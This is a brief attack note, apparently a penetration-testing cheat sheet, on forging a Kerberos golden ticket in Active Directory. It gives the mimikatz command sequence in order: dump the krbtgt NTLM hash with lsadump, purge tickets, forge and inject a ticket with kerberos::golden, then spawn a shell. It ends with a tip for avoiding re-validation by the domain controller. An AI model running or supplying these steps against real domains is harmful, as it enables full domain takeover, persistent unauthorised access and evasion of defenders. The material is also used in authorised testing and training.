# A GoldenTicket is a falsificated TGT with the NTLM hash from the krbtgt user that allow to their propetary to get into any resource of the domain. 
#
# Requirements:
#
# - The golden ticket will require us to have access to a Domain Admin's group account or to have compromised the domain controller itself in order to be able to retrieve the NTLM hash from the krbtgt user.
#
# First we use mimikatz through a elevated shell and extract the NTLM hash:

privilege::debug

lsadump::lsa /patch


# Then we delete all tickets in our session:

kerberos::purge

# And with the Domain SID, NTLM krbtgt hash we perform the following command:

kerberos::golden /user:<USERNAME> /domain:corp.com /sid:<DomainSID> /krbtgt:<krbtgtNTLMhash> /ptt

misc::cmd

# It is important to note that we are indeed performing a OverPassTheHash attack taking advance from a NTLM hash to get a TGT ticket and because of this we have to be careful to do nothing that could lead to the domain controller to investigate our user an revalidate our permissions like using IPs instead of hostnames
